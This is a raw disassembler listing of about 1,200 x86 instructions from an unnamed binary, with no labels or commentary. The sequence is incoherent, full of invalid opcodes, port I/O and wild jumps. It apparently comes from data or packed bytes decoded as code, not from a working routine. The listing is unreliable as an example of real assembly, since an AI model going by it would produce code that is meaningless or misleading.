  40cf32:	fiadd  DWORD PTR [edx-0x7b]
  40cf35:	aaa    
  40cf36:	fsub   DWORD PTR [ecx]
  40cf38:	adc    dh,BYTE PTR [esp+ecx*4+0x7b8f05b5]
  40cf3f:	dec    edx
  40cf40:	pop    ebp
  40cf41:	loop   0x40ceff
  40cf43:	dec    ebx
  40cf44:	pop    eax
  40cf45:	test   al,0x4f
  40cf47:	dec    ebp
  40cf48:	xor    al,0x8e
  40cf4a:	or     DWORD PTR gs:[ebp-0x402ccc52],ecx
  40cf51:	mov    eax,ds:0xb493eac3
  40cf56:	push   eax
  40cf57:	inc    ebp
  40cf58:	jle    0x40cf14
  40cf5a:	cmp    eax,0xae5f1156
  40cf5f:	lea    esi,[eax]
  40cf61:	xchg   edi,eax
  40cf62:	xchg   ebx,eax
  40cf63:	push   eax
  40cf64:	or     al,0xe4
  40cf66:	cmp    eax,DWORD PTR [ebx]
  40cf68:	aaa    
  40cf69:	in     eax,dx
  40cf6a:	dec    esp
  40cf6b:	xor    edi,edi
  40cf6d:	inc    edi
  40cf6e:	imul   ecx,ebx,0xffffff99
  40cf71:	jne    0x40cf0c
  40cf73:	cmp    ecx,edx
  40cf75:	jl     0x40cf2e
  40cf77:	fidiv  WORD PTR [ebx]
  40cf79:	mov    cs,edi
  40cf7b:	push   eax
  40cf7c:	mov    dl,BYTE PTR [ecx+0xae2aa40]
  40cf82:	xchg   ecx,eax
  40cf83:	fild   WORD PTR [ebp+ecx*1-0x618b3c]
  40cf8a:	clc    
  40cf8b:	repz loope 0x40cfae
  40cf8e:	rcl    DWORD PTR [eax],1
  40cf90:	cmp    al,0x78
  40cf92:	js     0x40cf91
  40cf94:	dec    ecx
  40cf95:	mov    edi,0xf5efb797
  40cf9a:	aaa    
  40cf9b:	fs mov ebx,0x1614ff5f
  40cfa1:	(bad)  
  40cfa2:	pusha  
  40cfa3:	adc    DWORD PTR [ecx-0x60d74800],edx
  40cfa9:	out    0xc1,al
  40cfab:	mov    edx,0x6436701c
  40cfb0:	popa   
  40cfb1:	loope  0x40cfdb
  40cfb3:	iret   
  40cfb4:	(bad)
  40cfb7:	mov    ch,0x58
  40cfb9:	fbstp  TBYTE PTR [eax]
  40cfbb:	test   ebp,ebx
  40cfbd:	popa   
  40cfbe:	fwait
  40cfbf:	jae    0x40cfce
  40cfc1:	call   0xd817e8f2
  40cfc6:	xchg   ebp,eax
  40cfc7:	xchg   edi,eax
  40cfc8:	cmc    
  40cfc9:	rol    ch,cl
  40cfcb:	(bad)  
  40cfcc:	mov    ecx,0xf12448c0
  40cfd1:	test   eax,0xb39dfd28
  40cfd6:	pop    edx
  40cfd7:	adc    eax,0x99c70f42
  40cfdc:	pop    ds
  40cfdd:	ds push edi
  40cfdf:	int    0xf4
  40cfe1:	retf   
  40cfe2:	sbb    ebp,DWORD PTR [esi-0x6b]
  40cfe5:	lock icebp 
  40cfe7:	dec    ax
  40cfe9:	ins    BYTE PTR es:[edi],dx
  40cfea:	bound  ecx,QWORD PTR [eax]
  40cfec:	cld    
  40cfed:	and    eax,0xc2f5285f
  40cff2:	ret    0x18b0
  40cff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cff6:	add    edi,DWORD PTR [esi]
  40cff8:	adc    al,0x91
  40cffa:	jnp    0x40d007
  40cffc:	mov    al,0xb2
  40cffe:	sub    DWORD PTR [ecx-0x5c],esp
  40d001:	ins    BYTE PTR es:[edi],dx
  40d002:	in     al,dx
  40d003:	jp     0x40d050
  40d005:	cli    
  40d006:	rol    DWORD PTR [edx+0x33],cl
  40d009:	daa    
  40d00a:	inc    ebp
  40d00b:	jg     0x40d013
  40d00d:	jbe    0x40cfb1
  40d00f:	repz jb 0x40d026
  40d012:	mov    eax,0x5c43e021
  40d017:	cld    
  40d018:	in     eax,dx
  40d019:	(bad)  
  40d01b:	int3   
  40d01c:	pop    ebx
  40d01d:	sub    esp,edi
  40d01f:	sub    eax,0x97d2c955
  40d024:	cdq    
  40d025:	rcr    ch,1
  40d027:	xor    al,0xab
  40d029:	in     al,dx
  40d02a:	fisub  DWORD PTR [ecx]
  40d02c:	stc    
  40d02d:	push   esi
  40d02e:	fwait
  40d02f:	mov    DWORD PTR [edx*1-0x2f6e3cdf],esp
  40d036:	leave  
  40d037:	sub    ebx,DWORD PTR [ecx-0xe5ecdd0]
  40d03d:	mov    DWORD PTR ds:0xd85e2583,esp
  40d043:	mov    eax,0xa9ba44f8
  40d048:	mov    ebp,0x4ddb40da
  40d04d:	inc    ebx
  40d04e:	pushf  
  40d04f:	sar    ah,cl
  40d051:	jns    0x40d010
  40d053:	sbb    al,0xf8
  40d055:	sbb    ch,BYTE PTR [edi]
  40d057:	mov    edi,fs
  40d059:	mov    dl,dh
  40d05b:	jp     0x40d0ae
  40d05d:	repz das 
  40d05f:	pop    esp
  40d060:	scas   eax,DWORD PTR es:[edi]
  40d061:	pop    ebp
  40d062:	pop    ebx
  40d063:	add    edi,DWORD PTR ds:0x4515852f
  40d069:	ret    0xdb63
  40d06c:	sub    al,0x78
  40d06e:	test   ecx,ecx
  40d070:	xlat   BYTE PTR ds:[ebx]
  40d071:	xchg   ebx,eax
  40d072:	pop    edx
  40d073:	stc    
  40d074:	pop    edx
  40d075:	dec    ebp
  40d076:	out    dx,eax
  40d077:	sbb    ch,al
  40d079:	dec    ecx
  40d07a:	repnz lahf 
  40d07c:	mov    esp,0x20e58526
  40d081:	outs   dx,BYTE PTR ds:[esi]
  40d082:	add    DWORD PTR [ecx],edx
  40d084:	cmp    esi,DWORD PTR [eax+0x58]
  40d087:	sbb    edx,DWORD PTR [ebx-0x41]
  40d08a:	adc    ch,BYTE PTR [ecx-0x3c]
  40d08d:	pop    ebp
  40d08e:	or     ebx,DWORD PTR [eax-0x31e627b9]
  40d094:	push   edi
  40d095:	dec    edi
  40d096:	sbb    BYTE PTR [eax-0x2b],bh
  40d099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d09a:	shl    DWORD PTR [edi-0x6e2c2df2],cl
  40d0a0:	mov    ah,0xcd
  40d0a2:	and    eax,DWORD PTR [ebx-0xd922eda]
  40d0a8:	ins    DWORD PTR es:[edi],dx
  40d0a9:	aam    0x45
  40d0ab:	jno    0x40d100
  40d0ad:	dec    edx
  40d0ae:	jmp    0x40d0e9
  40d0b0:	pop    si
  40d0b2:	mov    ds:0xecdc7939,eax
  40d0b7:	popa   
  40d0b8:	or     ch,BYTE PTR [eax+0x58]
  40d0bb:	mov    eax,0x7cdb5f2a
  40d0c0:	xor    al,BYTE PTR [ecx-0x1b5558b7]
  40d0c6:	pusha  
  40d0c7:	sbb    dh,BYTE PTR [eax+0x78]
  40d0ca:	pop    ss
  40d0cb:	xor    BYTE PTR [eax-0x42],dl
  40d0ce:	lods   eax,DWORD PTR ds:[esi]
  40d0cf:	mov    esp,0x6ff28953
  40d0d4:	push   ebp
  40d0d5:	cmp    edi,DWORD PTR [edi]
  40d0d7:	pop    edx
  40d0d8:	mov    bh,0x36
  40d0da:	imul   edx,DWORD PTR [ebp+0x7e],0xffffffc7
  40d0de:	(bad)  
  40d0df:	imul   ebx,DWORD PTR [ebx+0x3220a0a],0xf
  40d0e6:	mov    eax,0x6cd1386e
  40d0eb:	or     ebx,DWORD PTR [edx+0x31]
  40d0ee:	test   DWORD PTR [esi+0x3dffd5ef],esp
  40d0f4:	ss mov esp,0x591cd8b1
  40d0fa:	cld    
  40d0fb:	mov    gs,WORD PTR [ecx-0x79a276a9]
  40d101:	test   eax,0x7de77e52
  40d106:	imul   esp,edx,0xffffffd5
  40d109:	lea    ebp,[ecx]
  40d10b:	test   BYTE PTR [ebx-0x72b3436a],0xd
  40d112:	or     al,0x88
  40d114:	adc    BYTE PTR [esi+0x45],al
  40d117:	imul   esi,esp,0x7b
  40d11a:	ins    BYTE PTR es:[edi],dx
  40d11b:	xor    eax,0x875bc0e0
  40d120:	jnp    0x40d10b
  40d122:	test   DWORD PTR [eax],ecx
  40d124:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d125:	inc    ebp
  40d126:	mov    dh,BYTE PTR [edi-0x194d4a86]
  40d12c:	mov    ch,0x78
  40d12e:	dec    ecx
  40d12f:	push   edi
  40d130:	mov    eax,0x6a5cc89a
  40d135:	popa   
  40d136:	jnp    0x40d13d
  40d138:	jecxz  0x40d117
  40d13a:	and    BYTE PTR [ebx+0x5b],dl
  40d13d:	jns    0x40d161
  40d13f:	mov    ?,edi
  40d141:	mov    eax,0x8822d770
  40d146:	sub    esp,eax
  40d148:	fcomp  QWORD PTR [ebx+0x11]
  40d14b:	stos   BYTE PTR es:[edi],al
  40d14c:	retf   
  40d14d:	fwait
  40d14e:	add    eax,0x39311244
  40d153:	in     al,0xe6
  40d155:	sbb    DWORD PTR [ecx+0x4],esp
  40d158:	cmp    al,0xb9
  40d15a:	inc    ebp
  40d15b:	push   ebx
  40d15c:	pop    ebp
  40d15d:	pop    esi
  40d15e:	mov    al,ds:0x4c58792b
  40d163:	std    
  40d164:	push   0x7ccf28f6
  40d169:	mov    bh,0x97
  40d16b:	add    al,0x8e
  40d16d:	xor    BYTE PTR [ecx],ah
  40d16f:	fwait
  40d170:	pop    esp
  40d171:	cmc    
  40d172:	push   cs
  40d173:	jns    0x40d1da
  40d175:	(bad)
  40d178:	push   eax
  40d179:	retf   0xbb7d
  40d17c:	aas    
  40d17d:	adc    BYTE PTR [ecx+0x186a8e52],0x46
  40d184:	ins    DWORD PTR es:[edi],dx
  40d185:	mov    eax,0xbf3e9fe6
  40d18a:	sub    al,BYTE PTR ds:0x501c7d8f
  40d190:	push   esp
  40d191:	fst    QWORD PTR [ebp-0x56d044a6]
  40d197:	jno    0x40d1be
  40d199:	pop    esp
  40d19a:	inc    ebx
  40d19b:	or     al,0x81
  40d19d:	int    0x38
  40d19f:	push   cs
  40d1a0:	jnp    0x40d19d
  40d1a2:	sti    
  40d1a3:	fimul  WORD PTR [esi+0x5fb44fd1]
  40d1a9:	bound  esp,QWORD PTR [edx-0x75]
  40d1ac:	call   FWORD PTR [eax+0x4c05777f]
  40d1b2:	mov    edi,DWORD PTR [ebx]
  40d1b4:	mov    bl,0xed
  40d1b6:	jl     0x40d172
  40d1b8:	or     bh,BYTE PTR [ebp+0x5b]
  40d1bb:	test   ch,bl
  40d1bd:	inc    ebp
  40d1be:	dec    ebp
  40d1bf:	push   esp
  40d1c0:	sbb    DWORD PTR [ebx],esp
  40d1c2:	adc    eax,DWORD PTR [ebx-0x70692896]
  40d1c8:	jecxz  0x40d208
  40d1ca:	add    eax,0x5372451e
  40d1cf:	idiv   BYTE PTR [edi+0x510d6623]
  40d1d5:	std    
  40d1d6:	into   
  40d1d7:	out    0xc5,eax
  40d1d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1da:	cwde   
  40d1db:	dec    ebp
  40d1dc:	push   es
  40d1dd:	xor    ebp,edx
  40d1df:	jecxz  0x40d1eb
  40d1e1:	stos   DWORD PTR es:[edi],eax
  40d1e2:	adc    esp,DWORD PTR [edi]
  40d1e4:	shl    DWORD PTR [ebx],1
  40d1e6:	jb     0x40d205
  40d1e8:	jecxz  0x40d196
  40d1ea:	ds retf 
  40d1ec:	sub    DWORD PTR [esi-0x7175c90f],ebp
  40d1f2:	lods   eax,DWORD PTR ds:[esi]
  40d1f3:	mov    dh,bl
  40d1f5:	xchg   ecx,eax
  40d1f6:	loope  0x40d1e1
  40d1f8:	cwde   
  40d1f9:	and    ch,BYTE PTR [edx-0x1f]
  40d1fc:	push   esi
  40d1fd:	hlt    
  40d1fe:	jnp    0x40d1f1
  40d200:	sub    DWORD PTR [edx+ebx*8-0x1e],eax
  40d204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d205:	inc    esi
  40d206:	fcomp  QWORD PTR [edx]
  40d208:	add    BYTE PTR [edi],dh
  40d20a:	push   edi
  40d20b:	stc    
  40d20c:	pop    ebp
  40d20d:	dec    edi
  40d20e:	je     0x40d282
  40d210:	int3   
  40d211:	cdq    
  40d212:	add    al,0x92
  40d214:	adc    bl,ah
  40d216:	add    cl,ch
  40d218:	inc    ecx
  40d219:	das    
  40d21a:	dec    eax
  40d21b:	int    0xa4
  40d21d:	xchg   ebx,eax
  40d21e:	(bad)  
  40d21f:	jl     0x40d1b2
  40d221:	pop    edi
  40d222:	mov    ds:0x3fb9dcb7,eax
  40d227:	xor    ebx,DWORD PTR [esi-0x48]
  40d22a:	mov    ?,esi
  40d22c:	push   ss
  40d22d:	mov    ebp,0x33e3f82e
  40d232:	sub    ebx,DWORD PTR [eax+0x16069781]
  40d238:	adc    ecx,ebp
  40d23a:	in     al,0x3
  40d23c:	inc    eax
  40d23d:	arpl   WORD PTR [edx+eax*1],sp
  40d240:	add    eax,0xfd68eabe
  40d245:	push   0x4d3b929a
  40d24a:	(bad)  
  40d24b:	mov    ecx,0xd65207f8
  40d250:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d251:	je     0x40d240
  40d253:	scas   eax,DWORD PTR es:[edi]
  40d254:	xchg   DWORD PTR [edi+0x5a74779a],edx
  40d25a:	icebp  
  40d25b:	push   esi
  40d25c:	mov    ebx,0x9a907a52
  40d261:	sbb    dl,BYTE PTR [edx-0x6f928fdd]
  40d267:	pushf  
  40d268:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40d26a:	(bad)  
  40d26b:	push   edi
  40d26c:	adc    eax,0x38041176
  40d271:	aaa    
  40d272:	fdiv   QWORD PTR [ecx-0x9]
  40d275:	test   eax,0xe34166d9
  40d27a:	ja     0x40d204
  40d27c:	test   DWORD PTR [edi-0x5835fac2],0x2d87a1e0
  40d286:	test   DWORD PTR [eax-0x73],esp
  40d289:	popf   
  40d28a:	loop   0x40d2b7
  40d28c:	and    BYTE PTR [ecx+0x51],ah
  40d28f:	jnp    0x40d230
  40d291:	retf   
  40d292:	rcr    DWORD PTR [edi],0xb9
  40d295:	adc    dh,dh
  40d297:	test   al,0x4
  40d299:	clc    
  40d29a:	fxch   st(4)
  40d29c:	int    0x54
  40d29e:	paddw  mm4,QWORD PTR [esi+0x51]
  40d2a2:	mov    dh,0x28
  40d2a4:	xchg   ebx,eax
  40d2a5:	loopne 0x40d2fa
  40d2a7:	or     al,0x18
  40d2a9:	jmp    0x40d26a
  40d2ab:	and    ch,dh
  40d2ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2ae:	inc    ecx
  40d2af:	pop    edx
  40d2b0:	aad    0xf4
  40d2b2:	addr16 pop esp
  40d2b4:	mov    dl,BYTE PTR [ebp-0x57]
  40d2b7:	jo     0x40d26c
  40d2b9:	dec    edi
  40d2ba:	jnp    0x40d2f3
  40d2bc:	stos   DWORD PTR es:[edi],eax
  40d2bd:	or     ch,BYTE PTR [edx+0x2d]
  40d2c0:	loop   0x40d27a
  40d2c2:	jle    0x40d275
  40d2c4:	fistp  QWORD PTR [ebx+ebp*2]
  40d2c7:	int    0x1f
  40d2c9:	jge    0x40d2b5
  40d2cb:	mov    ebx,DWORD PTR [edx-0x1e]
  40d2ce:	jmp    0x6b17ba11
  40d2d3:	shl    ebp,cl
  40d2d5:	and    eax,DWORD PTR [edx]
  40d2d7:	cmp    ebx,DWORD PTR [eax]
  40d2d9:	pop    ds
  40d2da:	cmp    edi,ebx
  40d2dc:	jo     0x40d274
  40d2de:	inc    ebp
  40d2df:	std    
  40d2e0:	mov    al,ds:0x85fc9edd
  40d2e5:	leave  
  40d2e6:	stc    
  40d2e7:	in     al,dx
  40d2e8:	dec    edi
  40d2e9:	shr    DWORD PTR fs:[ebp-0x4a],0x6d
  40d2ee:	jns    0x40d280
  40d2f0:	add    eax,0x4faa9715
  40d2f5:	sbb    eax,0x5471ef4f
  40d2fa:	mov    dh,dh
  40d2fc:	dec    ebx
  40d2fd:	and    DWORD PTR [ebx+edx*4],edi
  40d300:	cmc    
  40d301:	sbb    DWORD PTR [esi-0x5e6b2a44],esp
  40d307:	cmp    ebp,edx
  40d309:	xor    al,dl
  40d30b:	dec    ecx
  40d30c:	mov    esp,0x5c13ac68
  40d311:	cs loope 0x40d2c1
  40d314:	aas    
  40d315:	mov    gs:0x4491eb64,al
  40d31b:	mov    edx,0xbd060ebc
  40d320:	pop    edi
  40d321:	fbld   TBYTE PTR [ecx-0x14da0aa8]
  40d327:	in     al,0xc0
  40d329:	(bad)  
  40d32a:	stc    
  40d32b:	mov    esi,0x354c0a2d
  40d330:	inc    ebp
  40d331:	sahf   
  40d332:	js     0x40d324
  40d334:	xchg   edi,eax
  40d335:	lea    esp,[edx+0x2084ca45]
  40d33b:	push   ebp
  40d33c:	sti    
  40d33d:	ds call 0x3b929513
  40d343:	mov    dl,0x9b
  40d345:	jp     0x40d31d
  40d347:	fdiv   QWORD PTR [ebx-0x3d30fc49]
  40d34d:	add    esp,DWORD PTR [edi+0x21]
  40d350:	ds dec edx
  40d352:	rol    BYTE PTR [ebx+0x5ee4cd2b],cl
  40d358:	sub    BYTE PTR [edi+0xd2aaf0f],ch
  40d35e:	jmp    0x370d421b
  40d363:	out    dx,al
  40d364:	add    DWORD PTR [edx-0x38],ebp
  40d367:	(bad)  [edx-0x1b8f1f33]
  40d36d:	sbb    bl,BYTE PTR [edx+0x666fa633]
  40d373:	jmp    0x40d317
  40d375:	push   ds
  40d376:	sbb    edi,edx
  40d378:	xchg   esi,eax
  40d379:	in     eax,dx
  40d37a:	loope  0x40d312
  40d37c:	loope  0x40d348
  40d37e:	cmp    eax,0xe50ba146
  40d383:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d384:	out    0xdc,eax
  40d386:	jno    0x40d361
  40d388:	inc    edi
  40d389:	std    
  40d38a:	retf   0xb6aa
  40d38d:	mov    ecx,0xb0903f5e
  40d392:	out    dx,eax
  40d393:	ins    DWORD PTR es:[edi],dx
  40d394:	add    eax,0xbbcb4cb5
  40d399:	lea    edi,[esi+0xa]
  40d39c:	fst    QWORD PTR [eax-0x23]
  40d39f:	ret    0x2e88
  40d3a2:	mov    fs,WORD PTR es:[edx]
  40d3a5:	in     al,dx
  40d3a6:	sbb    BYTE PTR [ecx-0x67],cl
  40d3a9:	lods   eax,DWORD PTR ds:[esi]
  40d3aa:	jl     0x40d32f
  40d3ac:	cmp    BYTE PTR [eax-0x3b938c1e],bl
  40d3b2:	sub    al,BYTE PTR [edi]
  40d3b4:	mov    al,ds:0xdca1c2a2
  40d3b9:	stos   BYTE PTR es:[edi],al
  40d3ba:	dec    edx
  40d3bb:	ret    0x749d
  40d3be:	lods   al,BYTE PTR ds:[esi]
  40d3bf:	jae    0x40d35a
  40d3c1:	or     ch,ah
  40d3c3:	xor    ebp,DWORD PTR [eax+0xc]
  40d3c6:	xchg   esi,eax
  40d3c7:	jns    0x40d34d
  40d3c9:	cdq    
  40d3ca:	mov    esp,0x53dd49f8
  40d3cf:	pop    es
  40d3d0:	stc    
  40d3d1:	mov    edx,DWORD PTR [ebx*2-0x58039d4b]
  40d3d8:	push   ebp
  40d3d9:	and    DWORD PTR [esi],0xffffffc8
  40d3dc:	pop    es
  40d3dd:	xlat   BYTE PTR ds:[ebx]
  40d3de:	push   0xffffffd4
  40d3e0:	inc    ebx
  40d3e1:	js     0x40d37e
  40d3e3:	lods   eax,DWORD PTR ds:[esi]
  40d3e4:	adc    al,0x9b
  40d3e6:	daa    
  40d3e7:	inc    dl
  40d3e9:	cli    
  40d3ea:	pop    ebx
  40d3eb:	pop    esp
  40d3ec:	sub    DWORD PTR [edx],ecx
  40d3ee:	inc    esi
  40d3ef:	adc    dh,cl
  40d3f1:	mov    al,ds:0x5b1a66d3
  40d3f6:	inc    ebp
  40d3f7:	push   esi
  40d3f8:	mov    eax,0x870d6c6a
  40d3fd:	repz xor cl,dh
  40d400:	mov    ?,WORD PTR [ebp-0x37]
  40d403:	add    cl,BYTE PTR [esi]
  40d405:	pop    edx
  40d406:	ret    
  40d407:	dec    eax
  40d408:	imul   esi,DWORD PTR [edi],0x3f
  40d40b:	retf   
  40d40c:	pop    ebx
  40d40d:	outs   dx,DWORD PTR ds:[esi]
  40d40e:	add    edi,DWORD PTR [ecx]
  40d410:	ins    BYTE PTR es:[edi],dx
  40d411:	into   
  40d412:	test   cl,bh
  40d414:	into   
  40d415:	(bad)  
  40d416:	lods   al,BYTE PTR ds:[esi]
  40d417:	lods   al,BYTE PTR ds:[esi]
  40d418:	push   esp
  40d419:	inc    ecx
  40d41a:	mov    esi,0x7e2adeec
  40d41f:	mov    ch,0x37
  40d421:	or     eax,0x404f6c04
  40d426:	popf   
  40d427:	in     al,0xd5
  40d429:	mov    bl,0x4f
  40d42b:	test   dl,bh
  40d42d:	adc    BYTE PTR [edi+ecx*8-0x5],0x55
  40d432:	data16 aam 0xdf
  40d435:	dec    edx
  40d436:	pop    eax
  40d437:	gs pop es
  40d439:	mov    esp,ebx
  40d43b:	push   cs
  40d43c:	jg     0x40d4ac
  40d43e:	jno    0x40d436
  40d440:	push   edx
  40d441:	xor    bl,BYTE PTR [ebp-0x4d]
  40d444:	sbb    eax,0xcd64589e
  40d449:	inc    esp
  40d44a:	pop    es
  40d44b:	jbe    0x40d479
  40d44d:	mov    eax,0xa0f64a79
  40d452:	daa    
  40d453:	or     dh,BYTE PTR [ecx+edi*8]
  40d456:	mov    ch,0xbe
  40d458:	fidiv  WORD PTR [ebx]
  40d45a:	outs   dx,DWORD PTR ds:[esi]
  40d45b:	mov    edi,0xb9778bb6
  40d460:	int    0xe3
  40d462:	lea    edi,[edx-0x20]
  40d465:	inc    edx
  40d466:	mov    esp,eax
  40d468:	std    
  40d469:	mov    BYTE PTR ds:0x51244f3e,cl
  40d46f:	or     BYTE PTR [ecx],bl
  40d471:	push   edi
  40d472:	xor    eax,DWORD PTR [edi]
  40d474:	xchg   ebp,eax
  40d475:	sbb    DWORD PTR [eax-0x7f],ebp
  40d478:	xor    BYTE PTR [eax],dl
  40d47a:	jns    0x40d430
  40d47c:	dec    eax
  40d47d:	ret    
  40d47e:	cwde   
  40d47f:	mov    edi,0x4a31486e
  40d484:	dec    esi
  40d485:	(bad)  
  40d486:	and    eax,0xac06abd2
  40d48b:	sbb    BYTE PTR [ebp+0x5a648c6e],0xcb
  40d492:	xacquire xchg DWORD PTR [edx+0x374c90fc],ebp
  40d499:	push   esi
  40d49a:	stc    
  40d49b:	out    dx,al
  40d49c:	aaa    
  40d49d:	sahf   
  40d49e:	mov    eax,ds:0xa8e389d9
  40d4a3:	pushf  
  40d4a4:	mov    eax,ds:0x5395f3e7
  40d4a9:	fcmovu st,st(2)
  40d4ab:	and    eax,0x85e465ac
  40d4b0:	pmuludq mm1,QWORD PTR [edi+eiz*8]
  40d4b4:	adc    DWORD PTR [ebx],ebx
  40d4b6:	xor    bl,0xae
  40d4b9:	xor    eax,0xe93b7447
  40d4be:	loope  0x40d492
  40d4c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4c1:	xchg   ebx,eax
  40d4c2:	aaa    
  40d4c3:	cld    
  40d4c4:	jecxz  0x40d4be
  40d4c6:	scas   al,BYTE PTR es:[edi]
  40d4c7:	sar    DWORD PTR [ebp+0x57],1
  40d4ca:	cld    
  40d4cb:	clc    
  40d4cc:	xchg   edx,eax
  40d4cd:	pusha  
  40d4ce:	ins    DWORD PTR es:[edi],dx
  40d4cf:	cs mov esp,0x44b1c8df
  40d4d5:	mov    ebp,0xf5c20f55
  40d4da:	jo     0x40d47d
  40d4dc:	ds (bad) 
  40d4df:	xor    al,0xd5
  40d4e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4e2:	data16 fbld TBYTE PTR [esi]
  40d4e5:	outs   dx,BYTE PTR ds:[esi]
  40d4e6:	and    eax,0x24b72edb
  40d4eb:	je     0x40d492
  40d4ed:	adc    ah,ch
  40d4ef:	fsubr  QWORD PTR [ecx]
  40d4f1:	test   eax,0xe460012
  40d4f6:	repz dec ecx
  40d4f8:	ins    BYTE PTR es:[edi],dx
  40d4f9:	mov    ds:0xcfff605c,eax
  40d4fe:	daa    
  40d4ff:	sti    
  40d500:	push   edx
  40d501:	shl    DWORD PTR [esi-0x1c808542],1
  40d507:	outs   dx,BYTE PTR ds:[esi]
  40d508:	cmp    ecx,0x5493a02b
  40d50e:	cmp    ebx,edx
  40d510:	mov    ss,WORD PTR [eax-0x3e]
  40d513:	sub    ecx,ebx
  40d515:	pop    ds
  40d516:	int3   
  40d517:	scas   al,BYTE PTR es:[edi]
  40d518:	out    dx,al
  40d519:	or     DWORD PTR [ebp+0x2b4c44ce],0x4a47d576
  40d523:	lock push 0x4c
  40d526:	idiv   BYTE PTR [ebx]
  40d528:	dec    ecx
  40d529:	stc    
  40d52a:	pop    ebp
  40d52b:	cmp    BYTE PTR [eax-0x16195d24],bl
  40d531:	adc    BYTE PTR [ecx+eax*2+0xfe1cc4b],dh
  40d538:	retf   0x5fe8
  40d53b:	stos   BYTE PTR es:[edi],al
  40d53c:	rcl    BYTE PTR [edi-0x60],1
  40d53f:	out    0x14,eax
  40d541:	pop    es
  40d542:	mov    ch,0xfb
  40d544:	push   ss
  40d545:	sbb    dh,dh
  40d547:	pop    eax
  40d548:	cmp    BYTE PTR [edi],0x67
  40d54b:	or     DWORD PTR [edi],ebx
  40d54d:	scas   eax,DWORD PTR es:[edi]
  40d54e:	das    
  40d54f:	xor    edi,DWORD PTR [eax-0x2e]
  40d552:	jnp    0x40d571
  40d554:	imul   ebx,eax,0x5f
  40d557:	sbb    ebx,DWORD PTR [esi]
  40d559:	leave  
  40d55a:	jp     0x40d5b9
  40d55c:	clc    
  40d55d:	mov    ah,0x73
  40d55f:	cwde   
  40d560:	aam    0xef
  40d562:	sbb    al,0xd7
  40d564:	int3   
  40d565:	mov    ah,0x84
  40d567:	mov    DWORD PTR [edi-0x11],0x17f31b54
  40d56e:	xchg   esp,eax
  40d56f:	fld    QWORD PTR [ebx-0x7e]
  40d572:	jl     0x40d571
  40d574:	or     al,0x28
  40d576:	pop    ss
  40d577:	leave  
  40d578:	aad    0xc0
  40d57a:	sub    al,0x21
  40d57c:	push   eax
  40d57d:	push   ds
  40d57e:	shl    bl,cl
  40d580:	sbb    eax,0xe46318ad
  40d585:	pop    ebx
  40d586:	jp     0x40d53a
  40d588:	and    esp,DWORD PTR [eax-0x3a]
  40d58b:	stc    
  40d58c:	sbb    eax,0xbfa25bda
  40d591:	fldcw  WORD PTR ds:0xd7e33ad8
  40d597:	jne    0x40d618
  40d599:	mov    ecx,0x1c93ed4a
  40d59e:	in     al,dx
  40d59f:	xchg   esi,eax
  40d5a0:	repz das 
  40d5a2:	xchg   edi,eax
  40d5a3:	outs   dx,DWORD PTR ds:[esi]
  40d5a4:	mov    edx,0xb0ddc696
  40d5a9:	loop   0x40d5f4
  40d5ab:	out    dx,eax
  40d5ac:	adc    eax,0x96cb7268
  40d5b1:	xchg   edi,eax
  40d5b2:	je     0x40d5cc
  40d5b4:	ins    BYTE PTR es:[edi],dx
  40d5b5:	mov    esp,0x16051b3
  40d5ba:	lods   eax,DWORD PTR ds:[esi]
  40d5bb:	jo     0x40d545
  40d5bd:	not    ecx
  40d5bf:	and    dh,dh
  40d5c1:	push   cs
  40d5c2:	clc    
  40d5c3:	popf   
  40d5c4:	test   eax,0xffdfdded
  40d5c9:	xor    edi,DWORD PTR [ebp-0x1b]
  40d5cc:	push   ebp
  40d5cd:	cmp    cl,ah
  40d5cf:	bound  eax,QWORD PTR [edx]
  40d5d1:	dec    esp
  40d5d2:	es sti 
  40d5d4:	fadd   DWORD PTR [eax+0x5c853e80]
  40d5da:	call   esp
  40d5dc:	xlat   BYTE PTR ds:[ebx]
  40d5dd:	daa    
  40d5de:	hlt    
  40d5df:	pop    ebx
  40d5e0:	mov    cl,0x61
  40d5e2:	dec    esp
  40d5e3:	mov    es,edx
  40d5e5:	shl    BYTE PTR ds:0x35c82783,0x89
  40d5ec:	mov    ebp,0x46578fc6
  40d5f1:	inc    ecx
  40d5f2:	mov    WORD PTR [edi],gs
  40d5f4:	sbb    eax,0xa4b1387d
  40d5f9:	adc    eax,0xebd5ade6
  40d5fe:	out    0xf2,eax
  40d600:	jae    0x40d5fd
  40d602:	test   BYTE PTR [edx-0x8],bl
  40d605:	dec    edi
  40d606:	fwait
  40d607:	mov    edx,0xa55f23b
  40d60c:	(bad)  
  40d60d:	rep stos DWORD PTR es:[edi],eax
  40d60f:	mov    ebx,0xc749c412
  40d614:	xchg   ah,dh
  40d616:	shl    BYTE PTR [edi-0x5543d661],1
  40d61c:	sbb    ch,BYTE PTR [ebx+0x5a]
  40d61f:	xchg   ebx,eax
  40d620:	aam    0x94
  40d622:	aam    0x29
  40d624:	jmp    0x54c7ae2f
  40d629:	mov    edi,DWORD PTR [edx-0x4cb8f5d5]
  40d62f:	push   eax
  40d630:	in     eax,0x51
  40d632:	and    BYTE PTR [edx-0x7c84ad1c],dh
  40d638:	push   ebx
  40d639:	je     0x40d600
  40d63b:	(bad)  
  40d63c:	mov    cl,0x12
  40d63e:	xchg   edi,eax
  40d63f:	not    esp
  40d641:	or     ah,BYTE PTR [eax+0x18b7b74c]
  40d647:	lahf   
  40d648:	push   esi
  40d649:	sub    DWORD PTR [edx+0x75],0x5e
  40d64d:	aaa    
  40d64e:	inc    edx
  40d64f:	fadd   DWORD PTR [ebx-0xd]
  40d652:	adc    bl,ah
  40d654:	pop    ss
  40d655:	leave  
  40d656:	call   0x9c1eb972
  40d65b:	daa    
  40d65c:	push   ebx
  40d65d:	lods   al,BYTE PTR ds:[esi]
  40d65e:	mov    esi,0x336c933e
  40d663:	out    0x6e,eax
  40d665:	je     0x40d68f
